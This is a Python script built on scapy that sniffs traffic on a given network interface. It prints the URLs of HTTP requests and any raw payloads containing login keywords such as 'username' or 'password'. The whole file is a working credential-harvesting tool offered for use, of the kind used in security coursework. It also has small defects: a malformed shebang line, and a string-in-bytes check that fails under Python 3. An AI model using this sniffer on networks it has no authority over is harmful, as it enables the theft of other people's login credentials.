#!bin/user/env python

r""" This script sniffs the data packet flowing through the interface passed in the command shell and extracts and displays data stored in the RAW and HTTP layer of the packet. THe script shows the url and possible login credentials stored in the packet.
     The script imports following modules -
     - argparse :  To parse arguments passed with the script in the command shell.
     - scapy.all : To sniff the data packet flowing through the interface.
     - scapy.layers : To filter the data stored in a particular layer.
"""

import argparse
import scapy.all as scapy
from scapy.layers import http

def get_cmd_args():
    r""" This function gets the command line args and returns the interface as a string.
         It gets >>>
          -i or --interface for interface.
          -h or --help if you want any further details.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Interface on which flowing packets have to be sniffed")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface.For more details use -h or --help.")
    return options.interface

def sniff(interface):
    r""" This function sniffs the data packets flowing through the interface.This function call backs another function - process_sniffed_packet.
    :param interface: Interface through which flowing data packets have to be sniffed.
    :return:NONE
    """
    # scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="udp/port 21/arp/tcp")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    r""" This function gets the data packet and returns the url stored in the HTTP layer of the packet.
    :param packet: Data packet.
    :return: url stored in the HTTP layer in the packet.
    """
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    r""" This packet gets the data packet and returns the login info (if any) stored in the RAW layer of the packet else returns null.
    :param packet: Data packet.
    :return: Load data that contains the login info.
    """
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    r""" This function process the given data packet and extract info stored in its HTTP and RAW  layer.
    This function calls back two other functions -
    - get_url(packet) : Returns the url stored in the HTTP layer of the packet.
    - get_login_info(packet) : Returns the login info stored in the RAW layer of the packet.
    :param packet: Data packet to be processed.
    :return: NONE
    """
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info)


interface = get_cmd_args()
sniff(interface)